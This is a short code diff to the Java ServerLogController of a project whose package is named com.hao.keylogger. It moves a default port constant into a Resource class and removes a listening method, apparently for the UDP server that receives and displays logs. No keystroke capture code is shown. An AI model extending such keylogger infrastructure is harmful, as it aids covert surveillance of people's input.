@@ -4,6 +4,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 
 import com.hao.keylogger.models.Log;
+import com.hao.keylogger.models.Resource;
 import com.hao.keylogger.views.ServerView;
 
 public class ServerLogController {
@@ -17,7 +18,7 @@ public class ServerLogController {
 		this.log = log;
 		view.setController(this);
 		view.setHost(UDPServerHelper.getLocalHostIP());
-		view.setPort(DEFAULT_PORT);
+		view.setPort(Resource.DEFAULT_PORT);
 	}
 
 	public boolean startServer() {
@@ -29,7 +30,6 @@ public class ServerLogController {
 		
 		if (udpServerHelper.startServer()) {
 			appendToMonitory("Server started at " + hostName + ":" + port);
-			startListenning();
 			return true;
 		}
 		return false;
@@ -49,10 +49,6 @@ public class ServerLogController {
 		view.appendToMonitor(msg);
 		view.appendToMonitor("\n");
 		
-	}
-
-	private void startListenning() {
-		udpServerHelper.startListenning();
 	}
 
 
